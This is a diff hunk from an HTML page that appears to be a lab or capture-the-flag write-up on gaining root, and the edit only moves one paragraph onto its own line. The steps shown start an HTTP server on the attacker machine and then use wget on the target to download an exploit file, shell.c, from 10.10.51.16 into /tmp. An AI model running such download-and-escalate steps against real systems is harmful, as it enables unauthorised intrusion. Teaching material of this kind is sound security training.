@@ -154,7 +154,7 @@
             </code></pre></div>
             <p>then we use this commands to be root:</p>
             <p>in attacker machine we deploy a simple http server to send exploit to the target:</p>
-            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">python3 -m http.server 7000</code></pre></div>            <p>in target we go to the /tmp directory and run our exploit with this commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">python3 -m http.server 7000</code></pre></div>
             <p>in target we go to the /tmp directory and run our exploit with this commands:</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">cd /tmp</code></pre></div>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">wget http://10.10.51.16:7000/shell.c</code></pre></div>
